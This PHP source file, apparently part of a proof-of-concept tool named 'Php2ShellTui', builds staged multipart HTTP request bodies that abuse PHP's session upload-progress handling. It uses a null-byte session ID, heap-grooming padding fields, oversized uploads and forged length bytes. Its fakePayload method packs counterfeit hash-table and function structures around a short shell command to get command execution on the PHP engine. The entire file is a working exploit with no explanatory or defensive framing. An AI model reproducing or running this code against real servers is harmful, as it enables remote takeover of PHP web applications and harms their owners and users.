<?php

declare(strict_types=1);

namespace Php2ShellTui\Poc;

final class PayloadBuilder
{
    private const BOUNDARY = 'BBBBBBBBBB';
    private const PRELUDE_BOUNDARY = 'SSSSSSSSSSSSSSSSS';
    private const ROTATE_BOUNDARY = 'BNDRY12345';
    private const SID = 'attacksessionid0001';
    private const BIG_CHUNK = 1048576;

    public function rotateA(string $path, int $hugeMb): void
    {
        $fh = $this->open($path);

        try {
            for ($i = 0; $i < 1001; $i++) {
                $this->partPlain($fh, substr(sprintf('f%04d', $i), 0, 5), str_repeat('V', 3000), self::PRELUDE_BOUNDARY);
            }

            $this->partPlain($fh, 'PHPSESSID', "\0", self::PRELUDE_BOUNDARY);
            $this->partPlain($fh, 'PHP_SESSION_UPLOAD_PROGRESS', 'pwn', self::PRELUDE_BOUNDARY);
            $this->partFile($fh, 'f', 'a.txt', str_repeat('A', 64), self::PRELUDE_BOUNDARY);
            $this->partBig($fh, 'big', $hugeMb * 1024 * 1024, self::PRELUDE_BOUNDARY);
            $this->finish($fh, self::PRELUDE_BOUNDARY);
        } finally {
            fclose($fh);
        }
    }

    public function rotateB(string $path): void
    {
        $fh = $this->open($path);

        try {
            $this->partPlain($fh, 'PHPSESSID', self::SID, self::ROTATE_BOUNDARY);
            $this->partPlain($fh, 'PHP_SESSION_UPLOAD_PROGRESS', 'pwn', self::ROTATE_BOUNDARY);
            $this->finish($fh, self::ROTATE_BOUNDARY);
        } finally {
            fclose($fh);
        }
    }

    public function stage1A(string $path, int $hugeMb): void
    {
        $fh = $this->open($path);

        try {
            for ($i = 0; $i < 1001; $i++) {
                $this->partPlain($fh, sprintf('p%04d', $i), 'x', self::PRELUDE_BOUNDARY);
            }

            $this->partPlain($fh, 'PHPSESSID', "\0", self::PRELUDE_BOUNDARY);
            $this->partPlain($fh, 'PHP_SESSION_UPLOAD_PROGRESS', 'pwn', self::PRELUDE_BOUNDARY);
            $this->partFile($fh, 'f', 'a.txt', str_repeat('A', 64), self::PRELUDE_BOUNDARY);
            $this->partBig($fh, 'big', $hugeMb * 1024 * 1024, self::PRELUDE_BOUNDARY);
            $this->finish($fh, self::PRELUDE_BOUNDARY);
        } finally {
            fclose($fh);
        }
    }

    public function stage1B(string $path, int $stage1N, int $forgeLen): void
    {
        if ($stage1N < 0 || $forgeLen < 0x18) {
            throw new \InvalidArgumentException('Stage 1 parameters are invalid.');
        }

        $fh = $this->open($path);

        try {
            $this->partPlain($fh, 'PHPSESSID', self::SID, self::BOUNDARY);
            $this->partPlain($fh, 'PHP_SESSION_UPLOAD_PROGRESS', 'pwn', self::BOUNDARY);

            for ($i = 0; $i < $stage1N; $i++) {
                $value = substr(sprintf('v%04d', $i) . str_repeat('x', 44), 0, 48);
                $this->partPlain($fh, (string) (1000 + $i), $value, self::BOUNDARY);
            }

            $forge = str_repeat('A', $forgeLen);
            $forge = substr_replace($forge, pack('Q', 0x1000), 0x10, 8);
            $forge[0x18] = 'L';
            $this->partPlain($fh, '1999', $forge, self::BOUNDARY);
            $this->finish($fh, self::BOUNDARY);
        } finally {
            fclose($fh);
        }
    }

    public function stage2A(string $path, int $hugeMb): void
    {
        $fh = $this->open($path);

        try {
            for ($i = 0; $i < 1001; $i++) {
                $this->partPlain($fh, substr(sprintf('f%04d', $i), 0, 5), str_repeat('x', 39), self::PRELUDE_BOUNDARY);
            }

            $this->partPlain($fh, 'PHPSESSID', "\0", self::PRELUDE_BOUNDARY);
            $this->partPlain($fh, 'PHP_SESSION_UPLOAD_PROGRESS', 'pwn', self::PRELUDE_BOUNDARY);
            $this->partFile($fh, 'f', 'a.txt', str_repeat('A', 64), self::PRELUDE_BOUNDARY);
            $this->partBig($fh, 'big', $hugeMb * 1024 * 1024, self::PRELUDE_BOUNDARY);
            $this->finish($fh, self::PRELUDE_BOUNDARY);
        } finally {
            fclose($fh);
        }
    }

    public function stage2B(string $path, int $stage2T, int $stage2V): void
    {
        if ($stage2T < 0 || $stage2T >= 983 || $stage2V < 0) {
            throw new \InvalidArgumentException('Stage 2 parameters are invalid.');
        }

        $fh = $this->open($path);

        try {
            $this->partPlain($fh, 'PHPSESSID', self::SID, self::BOUNDARY);
            $this->partPlain($fh, 'PHP_SESSION_UPLOAD_PROGRESS', 'pwn', self::BOUNDARY);

            for ($i = 0; $i < 983; $i++) {
                $count = $i === $stage2T ? 16 : 1;
                for ($j = 0; $j < $count; $j++) {
                    $this->partPlain($fh, sprintf('a%04d[%d]', $i, $j), str_repeat('x', $stage2V), self::BOUNDARY);
                }
            }

            $this->finish($fh, self::BOUNDARY);
        } finally {
            fclose($fh);
        }
    }

    /**
     * @param list<array{0: int, 1: int}> $pads
     */
    public function stage3A(string $path, array $pads, int $hugeMb): void
    {
        $fh = $this->open($path);

        try {
            $this->partPlain($fh, 'PHPSESSID', str_repeat('a', 19), self::PRELUDE_BOUNDARY);
            $this->partPlain($fh, 'PHP_SESSION_UPLOAD_PROGRESS', 'ppp', self::PRELUDE_BOUNDARY);

            foreach ($pads as $i => [$nl, $vl]) {
                if ($nl < 0 || $vl < 0) {
                    throw new \InvalidArgumentException('Stage 3 pads must not be negative.');
                }

                $name = $nl > 0 ? substr(sprintf('p%0' . ($nl - 1) . 'd', $i), 0, $nl) : '';
                $this->partPlain($fh, $name, str_repeat('V', $vl), self::PRELUDE_BOUNDARY);
            }

            $this->partFile($fh, 'f', 'a.txt', str_repeat('A', 64), self::PRELUDE_BOUNDARY);
            $this->partBig($fh, 'big', $hugeMb * 1024 * 1024, self::PRELUDE_BOUNDARY);
            $this->finish($fh, self::PRELUDE_BOUNDARY);
        } finally {
            fclose($fh);
        }
    }

    public function stage3B(string $path, string $ht, ?string $ref, ?string $carrier): void
    {
        $fh = $this->open($path);

        try {
            $this->partPlain($fh, 'PHPSESSID', self::SID, self::BOUNDARY);
            $this->partPlain($fh, 'PHP_SESSION_UPLOAD_PROGRESS', 'pwn', self::BOUNDARY);

            if ($carrier !== null) {
                for ($i = 0; $i < 2; $i++) {
                    $this->partPlain($fh, sprintf('f%02d', $i), str_repeat('F', 15), self::BOUNDARY);
                }
                $this->partPlain($fh, 'g00', $carrier, self::BOUNDARY);

                for ($i = 0; $i < 15; $i++) {
                    $this->partPlain($fh, substr(sprintf('a%030d', $i), 0, 31), $ht, self::BOUNDARY);
                }
            } else {
                if ($ref === null) {
                    throw new \InvalidArgumentException('Stage 3 needs either a carrier or a fake reference.');
                }

                for ($i = 0; $i < 15; $i++) {
                    $this->partPlain($fh, substr(sprintf('a%030d', $i), 0, 31), $ht, self::BOUNDARY);
                }
                for ($i = 0; $i < 2; $i++) {
                    $this->partPlain($fh, sprintf('f%02d', $i), $ref, self::BOUNDARY);
                }
            }

            $this->finish($fh, self::BOUNDARY);
        } finally {
            fclose($fh);
        }
    }

    /**
     * @return array{ht: string, ref: ?string, carrier: ?string}
     */
    public function fakePayload(int $htdata, int $zif, string $command): array
    {
        if (strlen($command) > 14) {
            throw new \InvalidArgumentException('The stage-3 command must fit in 14 bytes.');
        }

        $ht = str_repeat("\0", 167);
        $this->put($ht, 0x00, pack('V', 1) . pack('V', 7));
        $this->put($ht, 0x08, pack('V', 0x10) . pack('V', 0xFFFFFFF8));
        $this->put($ht, 0x10, pack('P', $htdata + 0x20));
        $this->put($ht, 0x18, pack('V', 1) . pack('V', 1));
        $this->put($ht, 0x20, pack('V', 8) . pack('V', 0));
        $this->put($ht, 0x28, pack('P', 0));
        $this->put($ht, 0x30, pack('P', $zif));

        $e = 0x20;
        $this->put($ht, $e + 0x00, pack('P', 0));
        $this->put($ht, $e + 0x08, pack('P', 0));
        $this->put($ht, $e + 0x10, pack('P', $zif));
        $this->put($ht, $e + 0x18, pack('P', 0));
        $this->put($ht, $e + 0x20, pack('P', 0));
        $this->put($ht, $e + 0x28, pack('V', 0));
        $this->put($ht, $e + 0x2C, pack('V', 1));
        $this->put($ht, $e + 0x30, pack('P', 0));
        $this->put($ht, $e + 0x38, pack('P', 0));
        $this->put($ht, $e + 0x40, pack('V', 0));
        $this->put($ht, $e + 0x50, pack('P', $htdata + 0x80));
        $this->put($ht, $e + 0x58, pack('V', 6));

        $this->put($ht, 0x80, pack('V', 1) . pack('V', 0x106));
        $this->put($ht, 0x88, pack('P', 0));
        $this->put($ht, 0x90, pack('P', strlen($command)));
        $this->put($ht, 0x98, $command . "\0");

        $ref = str_repeat('X', 55);
        $this->put($ref, 0x10, pack('V', 1) . pack('V', 10));
        $this->put($ref, 0x18, pack('P', $htdata));
        $this->put($ref, 0x20, pack('P', 0x307));
        $this->put($ref, 0x28, pack('P', 0));

        $carrier = pack('V', 1) . pack('V', 0x1A) . substr(pack('P', $htdata), 0, 7);

        return ['ht' => $ht, 'ref' => $ref, 'carrier' => $carrier];
    }

    /**
     * @param resource $fh
     */
    private function partPlain(mixed $fh, string $name, string $value, string $boundary): void
    {
        $this->write($fh, '--' . $boundary . "\r\nContent-Disposition: form-data; name=\"" . $name . '"' . "\r\n\r\n" . $value . "\r\n");
    }

    /**
     * @param resource $fh
     */
    private function partFile(mixed $fh, string $name, string $filename, string $value, string $boundary): void
    {
        $this->write(
            $fh,
            '--' . $boundary . "\r\nContent-Disposition: form-data; name=\"" . $name
            . '"; filename="' . $filename . '"' . "\r\nContent-Type: application/octet-stream\r\n\r\n"
            . $value . "\r\n",
        );
    }

    /**
     * @param resource $fh
     */
    private function partBig(mixed $fh, string $name, int $length, string $boundary): void
    {
        $this->write($fh, '--' . $boundary . "\r\nContent-Disposition: form-data; name=\"" . $name . '"' . "\r\n\r\n");

        $remaining = $length;
        while ($remaining > 0) {
            $chunk = min($remaining, self::BIG_CHUNK);
            $this->write($fh, str_repeat('B', $chunk));
            $remaining -= $chunk;
        }

        $this->write($fh, "\r\n");
    }

    /**
     * @param resource $fh
     */
    private function finish(mixed $fh, string $boundary): void
    {
        $this->write($fh, '--' . $boundary . "--\r\n");
    }

    private function put(string &$buffer, int $offset, string $bytes): void
    {
        $buffer = substr_replace($buffer, $bytes, $offset, strlen($bytes));
    }

    /**
     * @return resource
     */
    private function open(string $path): mixed
    {
        $fh = @fopen($path, 'wb');
        if ($fh === false) {
            throw new \RuntimeException(sprintf('Cannot write the payload file "%s".', $path));
        }

        return $fh;
    }

    /**
     * @param resource $fh
     */
    private function write(mixed $fh, string $data): void
    {
        $length = strlen($data);
        $offset = 0;

        while ($offset < $length) {
            $written = fwrite($fh, substr($data, $offset));
            if ($written === false || $written === 0) {
                throw new \RuntimeException('Cannot write the payload file.');
            }
            $offset += $written;
        }
    }
}
